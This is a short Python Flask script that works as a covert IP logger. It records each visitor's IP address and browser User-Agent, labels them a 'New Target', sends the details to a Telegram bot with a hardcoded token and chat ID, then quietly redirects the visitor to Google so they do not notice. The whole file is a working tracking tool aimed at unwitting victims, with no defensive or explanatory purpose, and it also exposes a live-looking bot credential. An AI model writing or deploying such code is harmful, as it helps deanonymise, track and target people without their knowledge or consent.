import requests
from flask import Flask, request, redirect

app = Flask(__name__)

TOKEN = "8410134111:AAEtvLTBFE_5uLobXsm_HYvvhqiBMXs6Ifg"
ADMIN_ID = "8334245284"

@app.route('/')
def logger():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    message = f"New Target\nIP: {ip}\nUser-Agent: {request.user_agent}"
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ADMIN_ID}&text={message}"
    
    try:
        requests.get(url)
    except:
        pass

    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run()
